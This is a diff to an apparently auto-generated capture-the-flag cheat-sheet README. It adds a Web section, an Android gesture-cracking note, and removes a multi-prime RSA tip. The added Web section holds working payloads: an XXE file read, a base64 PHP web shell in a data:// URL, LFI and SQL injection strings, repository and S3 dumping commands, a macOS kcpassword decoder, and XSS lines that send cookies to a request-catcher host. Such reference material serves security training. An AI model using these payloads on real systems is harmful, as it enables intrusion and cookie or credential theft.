@@ -32,6 +32,7 @@ This file is auto generated using [build.py](build.py). To update it, update the
 * [Network](#network)
 * [Jail Break](#jail-break)
 * [Android](#android)
+* [Web](#web)
 * [Esoteric Languages](#esoteric-languages)
 * [Data Science](#data-science)
 * [Signal processing](#signal-processing)
@@ -1106,7 +1107,7 @@ The documentation can be found [here](https://volatility3.readthedocs.io)
 
 
 
-[AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) A.K.A. Rijndael is a **symmetric** cryptographic algorithm. It uses the same key for encryption and decryption.
+[AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) A.K.A. Rijndael is a **symmetric** cryptographic algorithm. It uses the **same key** for encryption and decryption.
 
 * AES ECB
 
@@ -1330,14 +1331,6 @@ Several attacks exist on RSA depending on the circumstances.
 	Variables typically given: `n`, `c`, `e`. _ALWAYS_ try and give to [http://factordb.com](http://factordb.com). If `p` and `q` are able to be determined, use some RSA decryptor; handmade code available here: [https://pastebin.com/ERAMhJ1v](https://pastebin.com/ERAMhJ1v)
 
 __If FactorDB cannot find factors, try [alpertron](https://www.alpertron.com.ar/ECM.HTM)__
-
-* RSA: Multi-prime RSA
-
-	When you see multi-prime RSA, you can use calculate `phi` by still using all the factors.
-
-    ```
-    phi = (a - 1) * (b - 1) * (c - 1)    # ... etcetera
-    ```
 
 
 * RSA: `e` is 3 (or small)
@@ -1707,11 +1700,21 @@ DNS can be used to exfiltrate data, for example to bypass firewalls.
 
 # Android
 
-⇨ [APK Forensics](#apk-forensics)<br>
+⇨ [System Forensics](#system-forensics)<br>⇨ [APK Forensics](#apk-forensics)<br>
 
 * [Android Studio](https://developer.android.com/studio)
 
     Main IDE for Android development. Java and Kotlin can be used.
+
+## System Forensics
+
+
+
+* [Gesture cracking]
+
+    The gesture needed to unlock the phone is stored in `/data/system/gesture.key` as a SHA1 hash of the gesture. [This python script](Android/Tools/gesture_cracker.py) or [this C program](Android/Tools/gesture_cracker.c) can be used to crack the gesture, .
+
+
 
 ## APK Forensics
 
@@ -1742,6 +1745,240 @@ DNS can be used to exfiltrate data, for example to bypass firewalls.
 * [`jd-gui`](https://github.com/java-decompiler/jd-gui)
 
 	A GUI tool to decompile Java code, and JAR files.
+
+
+
+<br><br>
+
+# Web
+
+⇨ [PHP](#php)<br>⇨ [SQL Injection](#sql-injection)<br>⇨ [Enumeration](#enumeration)<br>⇨ [XSS](#xss)<br>
+
+* [`wpscan`](https://wpscan.org/)
+
+  Scan [Wordpress](https://en.wikipedia.org/wiki/WordPress) sites for vulnerabilities.
+
+
+* XXE : XML External Entity
+
+    Include local files in XML. Can be used to make an **LFI** from a XML parser.
+    XML script to display the content of the file /flag :
+
+    Dont forget to use <?xml version="1.0" encoding="UTF-16"?> on Windows (for utf16).
+
+	``` xml
+	<?xml version="1.0"?>
+	<!DOCTYPE data [
+	<!ELEMENT data (#ANY)>
+	<!ENTITY file SYSTEM "file:///flag">
+	]>
+	<data>&file;</data>
+	```
+
+
+* [`nikto`](https://github.com/sullo/nikto)
+
+	Website scanner implemented in [Perl](https://en.wikipedia.org/wiki/Perl).
+
+
+* [Burpsuite](https://portswigger.net/burp) <span style="color:red">❤️</span>
+
+	Most used tool to do web pentesting. It is a proxy that allows you to intercept and modify HTTP requests and responses.
+
+
+* AWS / S3 Buckets dump
+
+	Dump all files from a S3 bucket that does not require authentication.
+
+	``` bash
+	aws s3 cp --recursive --no-sign-request s3://<bucket_name> .
+	```
+
+## PHP
+
+
+
+
+* Magic Hashes
+
+	A common vulnerability in [PHP](https://en.wikipedia.org/wiki/PHP) that fakes hash "collisions..." where the `==` operator falls short in [PHP](https://en.wikipedia.org/wiki/PHP) type comparison, thinking everything that follows `0e` is considered scientific notation (and therefore 0). More valuable info can be found here: [https://github.com/spaze/hashes](https://github.com/spaze/hashes).
+
+
+* `preg_replace`
+
+	A bug in older versions of [PHP](https://en.wikipedia.org/wiki/PHP) where the user could get remote code execution
+
+	[http://php.net/manual/en/function.preg-replace.php](http://php.net/manual/en/function.preg-replace.php)
+
+
+* [`phpdc.phpr`](https://github.com/lighttpd/xcache/blob/master/bin/phpdc.phpr)
+
+	A command-line tool to decode [`bcompiler`](http://php.net/manual/en/book.bcompiler.php) compiled [PHP](https://en.wikipedia.org/wiki/PHP) code.
+
+
+* [`php://filter` for Local File Inclusion](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) 
+
+	A bug in [PHP](https://en.wikipedia.org/wiki/PHP) where if GET HTTP variables in the URL are controlling the navigation of the web page, perhaps the source code is `include`-ing other files to be served to the user. This can be manipulated by using [PHP filters](http://php.net/manual/en/filters.php) to potentially retrieve source code. Example like so:
+
+	```
+	http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
+	```
+
+
+* `data://text/plain;base64` <span style="color:red">❤️</span>
+
+	A [PHP](https://en.wikipedia.org/wiki/PHP) stream that can be taken advantage of if used and evaluated as an `include` resource or evaluated. Can be used for RCE: check out this writeup: [https://ctftime.org/writeup/8868](https://ctftime.org/writeup/8868)
+
+	```
+	http://dommain.net?cmd=whoami&page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=
+	```
+
+
+* [`PHP Generic Gadget Chains`](https://github.com/ambionics/phpggc)
+
+	Payloads for Object injection in `unserialize` on different frameworks.
+
+
+
+## SQL Injection
+
+
+
+Occurs when user input is not properly sanitized and is used directly in a SQL query. This can be used to bypass authentication, read sensitive data, or even execute arbitrary code on the database server.
+
+The most commom one to use is the `"OR 1=1--` injection. This will always return true on a `WHERE` clause.
+
+The application will then see the query as:
+```sql
+SELECT * FROM users WHERE username = 'admin' AND password = "" OR 1=1--"
+```
+
+* SQL `IF` and `SLEEP` statements for Blind SQL Injection
+
+	Used to exfiltrate data when the target does not provide the result of the vulnerable query. If the provided condition is true, the query will take a certain amount of time to execute. If the condition is false, the query will execute faster.
+
+	```sql
+	/* Check if the first character of the password is 'a' */
+	SELECT IF(substr(password, 1, 1) = 'a', SLEEP(5), 1); 
+
+	/* Check if the second character of the password is 'b' */
+	SELECT IF(substr(password, 2, 1) = 'b', SLEEP(5), 1); 
+	
+	/* etc for all position and letters */
+	```
+
+
+
+* [`sqlmap`](https://github.com/sqlmapproject/sqlmap)
+
+	A command-line tool written in [Python](https://www.python.org/) to automatically detect and exploit vulnerable SQL injection points.
+
+
+
+## Enumeration
+
+
+
+
+
+* `robots.txt` <span style="color:red">❤️</span>
+
+	File to tell search engines not to index certain files or directories.
+
+
+* Mac / Macintosh / Apple Hidden Files `.DS_Store` [DS_Store_crawler](https://github.com/anantshri/DS_Store_crawler_parser)
+
+	On Mac, there is a hidden index file `.DS_Store` listing the content of the directory. Useful if you have a **LFI** vulnerability.
+
+    ```bash
+    python3 dsstore_crawler.py -i <url>
+    ```
+
+* Bazaar `.bzr` directory
+
+	Contains the history of the project. Can be used to find old versions of the project. Can be fetched with [https://github.com/kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)
+
+    Download the bzr repository:
+    ```bash
+    bzr branch <url> <out-dir>
+    ```
+
+
+* [`GitDumper`](https://github.com/arthaud/git-dumper) <span style="color:red">❤️</span>
+
+	A command-line tool that will automatically scrape and download a [git](https://git-scm.com/) repository hosted online with a given URL.
+
+    When `/.git` is reachable, there is a [git](https://git-scm.com/) repo that contains the history of the project. Can be used to find old versions of the project and to maybe find **credentials** in sources. Use git commands (from your favorite git cheatsheet) to navigate the history.
+
+    ```bash
+    gitdumper <url>/.git/ <out-dir>
+    ```
+
+* Mac AutoLogin Password Cracking with `/etc/kcpassword`
+
+	`/etc/kcpassword` is a file that contains the password for the Mac OS X auto-login user. It is encrypted with a key that is stored in the kernel, but sometimes it can be decrypted with the following python script:
+
+    ``` python
+    def kcpasswd(ciphertext):
+        key = '7d895223d2bcddeaa3b91f'
+        while len(key) < (len(ciphertext)*2):
+            key = key + key
+        key = binasciiunhexlify(key)
+        result = ''
+        for i in range(len(ciphertext)):
+            result += chr(ord(ciphertext[i]) ^ (key[i]))
+        return result
+    ```
+
+
+
+
+## XSS
+
+
+
+The **XSS** vulnerability occurs when a user can control the content of a web page. A malicious code can be used to steal cookies of authentified users, redirect the user to a malicious site, or even execute arbitrary code on the user's machine.
+
+Exemple of XSS :
+
+```html
+<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
+```
+
+These sites can be used to create hooks to catch HTTP requests:
+
+| Site |
+| --- |
+| [`requestb.in`](https://requestb.in/) |
+| [`hookbin.com`](https://hookbin.com/) |
+
+
+* [XSS Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+
+* Filter Evasion
+
+	[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) can be used to bypass XSS filters.
+
+* `HTTPOnly` cookie flag
+
+	When the `HTTPOnly` flag is set, the cookie is not accessible by JavaScript. This can be bypassed by using the target's browser as a proxy to recieve the cookie when it is sent to the victim's browser:
+
+	```html
+	<!-- With the script tag -->
+	<script>
+	fetch("https://target-site.url/")
+	.then((data) => fetch("https://<myHook>/?/=".concat(JSON.stringify(data)), { credentials: 'include' }));
+	</script>
+
+	<!-- With an image -->
+	<img src="https://target-site.url/" onerror="fetch('https://<myHook>/?/='+JSON.stringify(this), { credentials: 'include' })">
+	```
+
+
+
+* [XSStrike](https://github.com/UltimateHackers/XSStrike)
+
+	A python CLI tool for XSS detection and exploitation.
 
 
 
